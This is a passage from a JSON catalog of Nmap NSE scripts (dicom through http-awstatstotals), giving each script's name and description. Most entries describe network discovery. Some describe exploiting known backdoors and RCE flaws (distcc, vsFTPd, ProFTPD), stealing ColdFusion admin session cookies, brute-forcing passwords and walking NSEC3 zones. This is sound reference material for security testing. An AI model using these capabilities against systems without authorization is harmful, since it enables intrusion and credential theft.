    "description": "Attempts to discover DICOM servers (DICOM Service Provider) through a partial C-ECHO request.\n It also detects if the server allows any called Application Entity Title or not.\n\nThe script responds with the message \"Called AET check enabled\" when the association request\n is rejected due configuration. This value can be bruteforced.\n\nC-ECHO requests are commonly known as DICOM ping as they are used to test connectivity.\nNormally, a 'DICOM ping' is formed as follows:\n* Client -> A-ASSOCIATE request -> Server\n* Server -> A-ASSOCIATE ACCEPT/REJECT -> Client\n* Client -> C-ECHO request -> Server\n* Server -> C-ECHO response -> Client\n* Client -> A-RELEASE request -> Server\n* Server -> A-RELEASE response -> Client\n\nFor this script we only send the A-ASSOCIATE request and look for the success code\n in the response as it seems to be a reliable way of detecting DICOM servers.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dict-info.nse",
    "description": "Connects to a dictionary server using the DICT protocol, runs the SHOW\nSERVER command, and displays the result. The DICT protocol is defined in RFC\n2229 and is a protocol which allows a client to query a dictionary server for\ndefinitions from a set of natural language dictionary databases.\n\nThe SHOW server command must be implemented and depending on access will show\nserver information and accessible databases. If authentication is required, the\nlist of databases will not be shown.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "distcc-cve2004-2687.nse",
    "description": "Detects and exploits a remote code execution vulnerability in the distributed\ncompiler daemon distcc. The vulnerability was disclosed in 2002, but is still\npresent in modern implementation due to poor configuration of the service.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dns-blacklist.nse",
    "description": "Checks target IP addresses against multiple DNS anti-spam and open\nproxy blacklists and returns a list of services for which an IP has been flagged.  Checks may be limited by service category (eg: SPAM,\nPROXY) or to a specific service name.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dns-brute.nse",
    "description": "Attempts to enumerate DNS hostnames by brute force guessing of common\nsubdomains. With the <code>dns-brute.srv</code> argument, dns-brute will also\ntry to enumerate common DNS SRV records.\n\nWildcard records are listed as \"*A\" and \"*AAAA\" for IPv4 and IPv6 respectively.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dns-cache-snoop.nse",
    "description": "Performs DNS cache snooping against a DNS server.\n\nThere are two modes of operation, controlled by the\n<code>dns-cache-snoop.mode</code> script argument. In\n<code>nonrecursive</code> mode (the default), queries are sent to the\nserver with the RD (recursion desired) flag set to 0. The server should\nrespond positively to these only if it has the domain cached. In\n<code>timed</code> mode, the mean and standard deviation response times\nfor a cached domain are calculated by sampling the resolution of a name\n(www.google.com) several times. Then, each domain is resolved and the\ntime taken compared to the mean. If it is less than one standard\ndeviation over the mean, it is considered cached. The <code>timed</code>\nmode inserts entries in the cache and can only be used reliably once.\n\nThe default list of domains to check consists of the top 50 most popular\nsites, each site being listed twice, once with \"www.\" and once without.\nUse the <code>dns-cache-snoop.domains</code> script argument to use a\ndifferent list.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dns-check-zone.nse",
    "description": "Checks DNS zone configuration against best practices, including RFC 1912.\nThe configuration checks are divided into categories which each have a number\nof different tests.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dns-client-subnet-scan.nse",
    "description": "Performs a domain lookup using the edns-client-subnet option which\nallows clients to specify the subnet that queries supposedly originate\nfrom.  The script uses this option to supply a number of\ngeographically distributed locations in an attempt to enumerate as\nmany different address records as possible. The script also supports\nrequests using a given subnet.\n\n* https://tools.ietf.org/html/rfc7871",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dns-fuzz.nse",
    "description": "Launches a DNS fuzzing attack against DNS servers.\n\nThe script induces errors into randomly generated but valid DNS packets.\nThe packet template that we use includes one uncompressed and one\ncompressed name.\n\nUse the <code>dns-fuzz.timelimit</code> argument to control how long the\nfuzzing lasts. This script should be run for a long time. It will send a\nvery large quantity of packets and thus it's pretty invasive, so it\nshould only be used against private DNS servers as part of a software\ndevelopment lifecycle.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dns-ip6-arpa-scan.nse",
    "description": "Performs a quick reverse DNS lookup of an IPv6 network using a technique\nwhich analyzes DNS server response codes to dramatically reduce the number of queries needed to enumerate large networks.\n\nThe technique essentially works by adding an octet to a given IPv6 prefix\nand resolving it. If the added octet is correct, the server will return\nNOERROR, if not a NXDOMAIN result is received.\n\nThe technique is described in detail on Peter's blog:\nhttp://7bits.nl/blog/2012/03/26/finding-v6-hosts-by-efficiently-mapping-ip6-arpa",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dns-nsec-enum.nse",
    "description": "Enumerates DNS names using the DNSSEC NSEC-walking technique.\n\nOutput is arranged by domain. Within a domain, subzones are shown with\nincreased indentation.\n\nThe NSEC response record in DNSSEC is used to give negative answers to\nqueries, but it has the side effect of allowing enumeration of all\nnames, much like a zone transfer. This script doesn't work against\nservers that use NSEC3 rather than NSEC; for that, see\n<code>dns-nsec3-enum</code>.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dns-nsec3-enum.nse",
    "description": "Tries to enumerate domain names from the DNS server that supports DNSSEC\nNSEC3 records.\n\nThe script queries for nonexistant domains until it exhausts all domain\nranges keeping track of hashes. At the end, all hashes are printed along\nwith salt and number of iterations used. This technique is known as\n\"NSEC3 walking\".\n\nThat info should then be fed into an offline cracker, like\n<code>unhash</code> from https://dnscurve.org/nsec3walker.html, to\nbruteforce the actual names from the hashes. Assuming that the script\noutput was written into a text file <code>hashes.txt</code> like:\n<code>\ndomain example.com\nsalt 123456\niterations 10\nnexthash d1427bj0ahqnpi4t0t0aaun18oqpgcda vhnelm23s1m3japt7gohc82hgr9un2at\nnexthash k7i4ekvi22ebrim5b6celtaniknd6ilj prv54a3cr1tbcvqslrb7bftf5ji5l0p8\nnexthash 9ool6bk7r2diaiu81ctiemmb6n961mph nm7v0ig7h9c0agaedc901kojfj9bgabj\nnexthash 430456af8svfvl98l66shhrgucoip7mi mges520acstgaviekurg3oksh9u31bmb\n</code>\n\nRun this command to recover the domain names:\n<code>\n# ./unhash < hashes.txt > domains.txt\nnames: 8\nd1427bj0ahqnpi4t0t0aaun18oqpgcda ns.example.com.\nfound 1 private NSEC3 names (12%) using 235451 hash computations\nk7i4ekvi22ebrim5b6celtaniknd6ilj vulpix.example.com.\nfound 2 private NSEC3 names (25%) using 35017190 hash computations\n</code>\n\nUse the <code>dns-nsec-enum</code> script to handle servers that use NSEC\nrather than NSEC3.\n\nReferences:\n* https://dnscurve.org/nsec3walker.html",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dns-nsid.nse",
    "description": "No description available",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dns-random-srcport.nse",
    "description": "Checks a DNS server for the predictable-port recursion vulnerability.\nPredictable source ports can make a DNS server vulnerable to cache poisoning\nattacks (see CVE-2008-1447).\n\nThe script works by querying porttest.dns-oarc.net (see\nhttps://www.dns-oarc.net/oarc/services/porttest).  Be aware that any\ntargets against which this script is run will be sent to and\npotentially recorded by one or more DNS servers and the porttest\nserver. In addition your IP address will be sent along with the\nporttest query to the DNS server running on the target.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dns-random-txid.nse",
    "description": "Checks a DNS server for the predictable-TXID DNS recursion\nvulnerability.  Predictable TXID values can make a DNS server vulnerable to\ncache poisoning attacks (see CVE-2008-1447).\n\nThe script works by querying txidtest.dns-oarc.net (see\nhttps://www.dns-oarc.net/oarc/services/txidtest).  Be aware that any\ntargets against which this script is run will be sent to and\npotentially recorded by one or more DNS servers and the txidtest\nserver. In addition your IP address will be sent along with the\ntxidtest query to the DNS server running on the target.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dns-recursion.nse",
    "description": "Checks if a DNS server allows queries for third-party names. It is\nexpected that recursion will be enabled on your own internal\nnameservers.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dns-service-discovery.nse",
    "description": "Attempts to discover target hosts' services using the DNS Service Discovery protocol.\n\nThe script first sends a query for _services._dns-sd._udp.local to get a\nlist of services. It then sends a followup query for each one to try to\nget more information.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dns-srv-enum.nse",
    "description": "Enumerates various common service (SRV) records for a given domain name.\nThe service records contain the hostname, port and priority of servers for a given service.\nThe following services are enumerated by the script:\n  - Active Directory Global Catalog\n  - Exchange Autodiscovery\n  - Kerberos KDC Service\n  - Kerberos Passwd Change Service\n  - LDAP Servers\n  - SIP Servers\n  - XMPP S2S\n  - XMPP C2S",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dns-update.nse",
    "description": "Attempts to perform a dynamic DNS update without authentication.\n\nEither the <code>test</code> or both the <code>hostname</code> and\n<code>ip</code> script arguments are required. Note that the <code>test</code>\nfunction will probably fail due to using a static zone name that is not the\nzone configured on your target.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dns-zeustracker.nse",
    "description": "Checks if the target IP range is part of a Zeus botnet by querying ZTDNS @ abuse.ch.\nPlease review the following information before you start to scan:\n* https://zeustracker.abuse.ch/ztdns.php",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dns-zone-transfer.nse",
    "description": "Requests a zone transfer (AXFR) from a DNS server.\n\nThe script sends an AXFR query to a DNS server. The domain to query is\ndetermined by examining the name given on the command line, the DNS\nserver's hostname, or it can be specified with the\n<code>dns-zone-transfer.domain</code> script argument. If the query is\nsuccessful all domains and domain types are returned along with common\ntype specific data (SOA/MX/NS/PTR/A).\n\nThis script can run at different phases of an Nmap scan:\n* Script Pre-scanning: in this phase the script will run before any\nNmap scan and use the defined DNS server in the arguments. The script\narguments in this phase are: <code>dns-zone-transfer.server</code> the\nDNS server to use, can be a hostname or an IP address and must be\nspecified. The <code>dns-zone-transfer.port</code> argument is optional\nand can be used to specify the DNS server port.\n* Script scanning: in this phase the script will run after the other\nNmap phases and against an Nmap discovered DNS server. If we don't\nhave the \"true\" hostname for the DNS server we cannot determine a\nlikely zone to perform the transfer on.\n\nUseful resources\n* DNS for rocket scientists: http://www.zytrax.com/books/dns/\n* How the AXFR protocol works: http://cr.yp.to/djbdns/axfr-notes.html",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "docker-version.nse",
    "description": "Detects the Docker service version.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "domcon-brute.nse",
    "description": "Performs brute force password auditing against the Lotus Domino Console.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "domcon-cmd.nse",
    "description": "Runs a console command on the Lotus Domino Console using the given authentication credentials (see also: domcon-brute)",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "domino-enum-users.nse",
    "description": "Attempts to discover valid IBM Lotus Domino users and download their ID files by exploiting the CVE-2006-5835 vulnerability.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "dpap-brute.nse",
    "description": "Performs brute force password auditing against an iPhoto Library.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "drda-brute.nse",
    "description": "Performs password guessing against databases supporting the IBM DB2 protocol such as Informix, DB2 and Derby",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "drda-info.nse",
    "description": "Attempts to extract information from database servers supporting the DRDA\nprotocol. The script sends a DRDA EXCSAT (exchange server attributes)\ncommand packet and parses the response.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "duplicates.nse",
    "description": "Attempts to discover multihomed systems by analysing and comparing\ninformation collected by other scripts. The information analyzed\ncurrently includes, SSL certificates, SSH host keys, MAC addresses,\nand Netbios server names.\n\nIn order for the script to be able to analyze the data it has dependencies to\nthe following scripts: ssl-cert,ssh-hostkey,nbtstat.\n\nOne or more of these scripts have to be run in order to allow the duplicates\nscript to analyze the data.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "eap-info.nse",
    "description": "Enumerates the authentication methods offered by an EAP (Extensible\nAuthentication Protocol) authenticator for a given identity or for the\nanonymous identity if no argument is passed.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "enip-info.nse",
    "description": "This NSE script is used to send a EtherNet/IP packet to a remote device that\nhas TCP 44818 open. The script will send a Request Identity Packet and once a\nresponse is received, it validates that it was a proper response to the command\nthat was sent, and then will parse out the data. Information that is parsed\nincludes Device Type, Vendor ID, Product name, Serial Number, Product code,\nRevision Number, status, state, as well as the Device IP.\n\nThis script was written based of information collected by using the the\nWireshark dissector for CIP, and EtherNet/IP, The original information was\ncollected by running a modified version of the ethernetip.py script\n(https://github.com/paperwork/pyenip)\n\nhttp://digitalbond.com",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "epmd-info.nse",
    "description": "Connects to Erlang Port Mapper Daemon (epmd) and retrieves a list of nodes with their respective port numbers.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "eppc-enum-processes.nse",
    "description": "Attempts to enumerate process info over the Apple Remote Event protocol.\nWhen accessing an application over the Apple Remote Event protocol the\nservice responds with the uid and pid of the application, if it is running,\nprior to requesting authentication.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "fcrdns.nse",
    "description": "Performs a Forward-confirmed Reverse DNS lookup and reports anomalous results.\n\nReferences:\n* https://en.wikipedia.org/wiki/Forward-confirmed_reverse_DNS",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "finger.nse",
    "description": "Attempts to retrieve a list of usernames using the finger service.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "fingerprint-strings.nse",
    "description": "Prints the readable strings from service fingerprints of unknown services.\n\nNmap's service and application version detection engine sends named probes to\ntarget services and tries to identify them based on the response. When there is\nno match, Nmap produces a service fingerprint for submission. Sometimes,\ninspecting this fingerprint can give clues as to the identity of the service.\nHowever, the fingerprint is encoded and wrapped to ensure it doesn't lose data,\nwhich can make it hard to read.\n\nThis script simply unwraps the fingerprint and prints the readable ASCII strings\nit finds below the name of the probe it responded to. The probe names are taken\nfrom the nmap-service-probes file, not from the response.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "firewalk.nse",
    "description": "Tries to discover firewall rules using an IP TTL expiration technique known\nas firewalking.\n\nTo determine a rule on a given gateway, the scanner sends a probe to a metric\nlocated behind the gateway, with a TTL one higher than the gateway. If the probe\nis forwarded by the gateway, then we can expect to receive an ICMP_TIME_EXCEEDED\nreply from the gateway next hop router, or eventually the metric itself if it is\ndirectly connected to the gateway. Otherwise, the probe will timeout.\n\nIt starts with a TTL equals to the distance to the target. If the probe timeout,\nthen it is resent with a TTL decreased by one. If we get an ICMP_TIME_EXCEEDED,\nthen the scan is over for this probe.\n\nEvery \"no-reply\" filtered TCP and UDP ports are probed. As for UDP scans, this\nprocess can be quite slow if lots of ports are blocked by a gateway close to the\nscanner.\n\nScan parameters can be controlled using the <code>firewalk.*</code>\noptional arguments.\n\nFrom an original idea of M. Schiffman and D. Goldsmith, authors of the\nfirewalk tool.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "firewall-bypass.nse",
    "description": "Detects a vulnerability in netfilter and other firewalls that use helpers to\ndynamically open ports for protocols such as ftp and sip.\n\nThe script works by spoofing a packet from the target server asking for opening\na related connection to a target port which will be fulfilled by the firewall\nthrough the adequate protocol helper port. The attacking machine should be on\nthe same network segment as the firewall for this to work. The script supports\nftp helper on both IPv4 and IPv6. Real path filter is used to prevent such\nattacks.\n\nBased on work done by Eric Leblond.\n\nFor more information, see:\n\n* http://home.regit.org/2012/03/playing-with-network-layers-to-bypass-firewalls-filtering-policy/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "flume-master-info.nse",
    "description": "Retrieves information from Flume master HTTP pages.\n\nInformation gathered:\n* Flume version\n* Flume server id\n* Zookeeper/Hbase master servers present in configured flows\n* Java information\n* OS information\n* various other local configurations.\n\nIf this script is run wth -v, it will output lots more info.\n\nUse the <code>newtargets</code> script argument to add discovered hosts to\nthe Nmap scan queue.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "fox-info.nse",
    "description": "Tridium Niagara Fox is a protocol used within Building Automation Systems. Based\noff Billy Rios and Terry McCorkle's work this Nmap NSE will collect information\nfrom A Tridium Niagara system.\n\nhttp://digitalbond.com",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "freelancer-info.nse",
    "description": "Detects the Freelancer game server (FLServer.exe) service by sending a\nstatus query UDP probe.\n\nWhen run as a version detection script (<code>-sV</code>), the script\nwill report on the server name, current number of players, maximum\nnumber of players, and whether it has a password set. When run\nexplicitly (<code>--script freelancer-info</code>), the script will\nadditionally report on the server description, whether players can harm\nother players, and whether new players are allowed.\n\nSee http://sourceforge.net/projects/gameq/\n(relevant files: games.ini, packets.ini, freelancer.php)",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ftp-anon.nse",
    "description": "Checks if an FTP server allows anonymous logins.\n\nIf anonymous is allowed, gets a directory listing of the root directory\nand highlights writeable files.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ftp-bounce.nse",
    "description": "Checks to see if an FTP server allows port scanning using the FTP bounce method.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ftp-brute.nse",
    "description": "Performs brute force password auditing against FTP servers.\n\nBased on old ftp-brute.nse script by Diman Todorov, Vlatko Kosturjak and Ron Bowes.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ftp-libopie.nse",
    "description": "Checks if an FTPd is prone to CVE-2010-1938 (OPIE off-by-one stack overflow),\na vulnerability discovered by Maksymilian Arciemowicz and Adam \"pi3\" Zabrocki.\nSee the advisory at https://nmap.org/r/fbsd-sa-opie.\nBe advised that, if launched against a vulnerable host, this script will crash the FTPd.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ftp-proftpd-backdoor.nse",
    "description": "Tests for the presence of the ProFTPD 1.3.3c backdoor reported as BID\n45150. This script attempts to exploit the backdoor using the innocuous\n<code>id</code> command by default, but that can be changed with the\n<code>ftp-proftpd-backdoor.cmd</code> script argument.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ftp-syst.nse",
    "description": "Sends FTP SYST and STAT commands and returns the result.\n\nThe canonical SYST response of \"UNIX Type: L8\" is stripped or ignored, since it\nis meaningless. Typical FTP response codes (215 for SYST and 211 for STAT) are\nalso hidden.\n\nReferences:\n* https://cr.yp.to/ftp/syst.html",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ftp-vsftpd-backdoor.nse",
    "description": "Tests for the presence of the vsFTPd 2.3.4 backdoor reported on 2011-07-04\n(CVE-2011-2523). This script attempts to exploit the backdoor using the\ninnocuous <code>id</code> command by default, but that can be changed with\nthe <code>exploit.cmd</code> or <code>ftp-vsftpd-backdoor.cmd</code> script\narguments.\n\nReferences:\n\n* http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html\n* https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb\n* http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=CVE-2011-2523",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ftp-vuln-cve2010-4221.nse",
    "description": "Checks for a stack-based buffer overflow in the ProFTPD server, version\nbetween 1.3.2rc3 and 1.3.3b. By sending a large number of TELNET_IAC escape\nsequence, the proftpd process miscalculates the buffer length, and a remote\nattacker will be able to corrupt the stack and execute arbitrary code within\nthe context of the proftpd process (CVE-2010-4221). Authentication is not\nrequired to exploit this vulnerability.\n\nReference:\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4221\n* http://www.exploit-db.com/exploits/15449/\n* http://www.metasploit.com/modules/exploit/freebsd/ftp/proftp_telnet_iac",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ganglia-info.nse",
    "description": "Retrieves system information (OS version, available memory, etc.) from\na listening Ganglia Monitoring Daemon or Ganglia Meta Daemon.\n\nGanglia is a scalable distributed monitoring system for high-performance\ncomputing systems such as clusters and Grids. The information retrieved\nincludes HDD size, available memory, OS version, architecture (and more) from\neach of the systems in each of the clusters in the grid.\n\nFor more information about Ganglia, see:\n* http://ganglia.sourceforge.net/\n* http://en.wikipedia.org/wiki/Ganglia_(software)#Ganglia_Monitoring_Daemon_.28gmond.29\n* http://en.wikipedia.org/wiki/Ganglia_(software)#Ganglia_Meta_Daemon_.28gmetad.29",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "giop-info.nse",
    "description": "Queries a CORBA naming server for a list of objects.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "gkrellm-info.nse",
    "description": "Queries a GKRellM service for monitoring information. A single round of\ncollection is made, showing a snapshot of information at the time of the\nrequest.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "gopher-ls.nse",
    "description": "Lists files and directories at the root of a gopher service.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "gpsd-info.nse",
    "description": "Retrieves GPS time, coordinates and speed from the GPSD network daemon.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "hadoop-datanode-info.nse",
    "description": "Discovers information such as log directories from an Apache Hadoop DataNode\nHTTP status page.\n\nInformation gathered:\n* Log directory (relative to http://host:port/)",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "hadoop-jobtracker-info.nse",
    "description": "Retrieves information from an Apache Hadoop JobTracker HTTP status page.\n\nInformation gathered:\n* State of the JobTracker.\n* Date/time the service was started\n* Hadoop version\n* Hadoop Compile date\n* JobTracker ID\n* Log directory (relative to http://host:port/)\n* Associated TaskTrackers\n* Optionally also user activity history",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "hadoop-namenode-info.nse",
    "description": "Retrieves information from an Apache Hadoop NameNode HTTP status page.\n\nInformation gathered:\n* Date/time the service was started\n* Hadoop version\n* Hadoop compile date\n* Upgrades status\n* Filesystem directory (relative to http://host:port/)\n* Log directory (relative to http://host:port/)\n* Associated DataNodes.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "hadoop-secondary-namenode-info.nse",
    "description": "Retrieves information from an Apache Hadoop secondary NameNode HTTP status page.\n\nInformation gathered:\n* Date/time the service was started\n* Hadoop version\n* Hadoop compile date\n* Hostname or IP address and port of the master NameNode server\n* Last time a checkpoint was taken\n* How often checkpoints are taken (in seconds)\n* Log directory (relative to http://host:port/)\n* File size of current checkpoint",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "hadoop-tasktracker-info.nse",
    "description": "Retrieves information from an Apache Hadoop TaskTracker HTTP status page.\n\nInformation gathered:\n* Hadoop version\n* Hadoop Compile date\n* Log directory (relative to http://host:port/)",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "hartip-info.nse",
    "description": "This NSE script is used to send a HART-IP packet to a HART device that has TCP 5094 open.\nThe script will establish Session with HART device, then Read Unique Identifier and\nRead Long Tag packets are sent to parse the required HART device information.\nRead Sub-Device Identity Summary packet with Sub-Device index 00 01 is sent\nto request information on Sub-Device, if any available. If the response code\ndiffers from 0 (success), the error code is passed as Sub-Device Information.\nOtherwise, the required Sub-Device information is parsed from response packet.\n\nDevice/Sub-Device Information that is parsed includes Long Tag (user assigned device name),\nExpanded Device Type, Manufacturer ID, Device ID, Device Revision, Software Revision,\nHART Protocol Major Revision and Private Label Distributor.\n\nThis script was written based of HART Specifications available at\nhttps://www.fieldcommgroup.org/hart-specifications.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "hbase-master-info.nse",
    "description": "Retrieves information from an Apache HBase (Hadoop database) master HTTP status page.\n\nInformation gathered:\n* Hbase version\n* Hbase compile date\n* Hbase root directory\n* Hadoop version\n* Hadoop compile date\n* Average load\n* Zookeeper quorum server\n* Associated region servers",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "hbase-region-info.nse",
    "description": "Retrieves information from an Apache HBase (Hadoop database) region server HTTP status page.\n\nInformation gathered:\n* HBase version\n* HBase compile date\n* A bunch of metrics about the state of the region server\n* Zookeeper quorum server",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "hddtemp-info.nse",
    "description": "Reads hard disk information (such as brand, model, and sometimes temperature) from a listening hddtemp service.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "hnap-info.nse",
    "description": "Retrieve hardwares details and configuration information utilizing HNAP, the \"Home Network Administration Protocol\".\nIt is an HTTP-Simple Object Access Protocol (SOAP)-based protocol which allows for remote topology discovery,\nconfiguration, and management of devices (routers, cameras, PCs, NAS, etc.)",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "hostmap-bfk.nse",
    "description": "Discovers hostnames that resolve to the target's IP address by querying the online database at http://www.bfk.de/bfk_dnslogger.html.\n\nThe script is in the \"external\" category because it sends target IPs to a third party in order to query their database.\n\nThis script was formerly (until April 2012) known as hostmap.nse.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "hostmap-crtsh.nse",
    "description": "Finds subdomains of a web server by querying Google's Certificate Transparency\nlogs database (https://crt.sh).\n\nThe script will run against any target that has a name, either specified on the\ncommand line or obtained via reverse-DNS.\n\nNSE implementation of ctfr.py (https://github.com/UnaPibaGeek/ctfr.git) by Sheila Berta.\n\nReferences:\n* www.certificate-transparency.org",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "hostmap-robtex.nse",
    "description": "Discovers hostnames that resolve to the target's IP address by querying the online Robtex service at http://ip.robtex.com/.\n\n*TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-adobe-coldfusion-apsa1301.nse",
    "description": "Attempts to exploit an authentication bypass vulnerability in Adobe Coldfusion\nservers to retrieve a valid administrator's session cookie.\n\nReference:\n* APSA13-01: http://www.adobe.com/support/security/advisories/apsa13-01.html",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-affiliate-id.nse",
    "description": "Grabs affiliate network IDs (e.g. Google AdSense or Analytics, Amazon\nAssociates, etc.) from a web page. These can be used to identify pages\nwith the same owner.\n\nIf there is more than one target using an ID, the postrule of this\nscript shows the ID along with a list of the targets using it.\n\nSupported IDs:\n* Google Analytics\n* Google AdSense\n* Amazon Associates",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-apache-negotiation.nse",
    "description": "Checks if the target http server has mod_negotiation enabled.  This\nfeature can be leveraged to find hidden resources and spider a web\nsite using fewer requests.\n\nThe script works by sending requests for resources like index and home\nwithout specifying the extension. If mod_negotiate is enabled (default\nApache configuration), the target would reply with content-location header\ncontaining target resource (such as index.html) and vary header containing\n\"negotiate\" depending on the configuration.\n\nFor more information, see:\n* http://www.wisec.it/sectou.php?id=4698ebdc59d15\n* Metasploit auxiliary module\n    /modules/auxiliary/scanner/http/mod_negotiation_scanner.rb",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-apache-server-status.nse",
    "description": "Attempts to retrieve the server-status page for Apache webservers that\nhave mod_status enabled. If the server-status page exists and appears to\nbe from mod_status the script will parse useful information such as the\nsystem uptime, Apache version and recent HTTP requests.\n\nReferences:\n* http://httpd.apache.org/docs/2.4/mod/mod_status.html\n* https://blog.sucuri.net/2012/10/popular-sites-with-apache-server-status-enabled.html\n* https://www.exploit-db.com/ghdb/1355/\n* https://github.com/michenriksen/nmap-scripts",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-aspnet-debug.nse",
    "description": "Determines if a ASP.NET application has debugging enabled using a HTTP DEBUG request.\n\nThe HTTP DEBUG verb is used within ASP.NET applications to start/stop remote\ndebugging sessions. The script sends a 'stop-debug' command to determine the\napplication's current configuration state but access to RPC services is required\n to interact with the debugging session. The request does not change the\napplication debugging configuration.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-auth-finder.nse",
    "description": "Spiders a web site to find web pages requiring form-based or HTTP-based authentication. The results are returned in a table with each url and the\ndetected method.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-auth.nse",
    "description": "Retrieves the authentication scheme and realm of a web service that requires\nauthentication.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-avaya-ipoffice-users.nse",
    "description": "Attempts to enumerate users in Avaya IP Office systems 7.x.\n\nAvaya IP Office systems allow unauthenticated access to the URI '/system/user/scn_user_list'\nwhich returns a XML file containing user information such as display name, full name and\nextension number.\n\n* Tested on Avaya IP Office 7.0(27).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-awstatstotals-exec.nse",
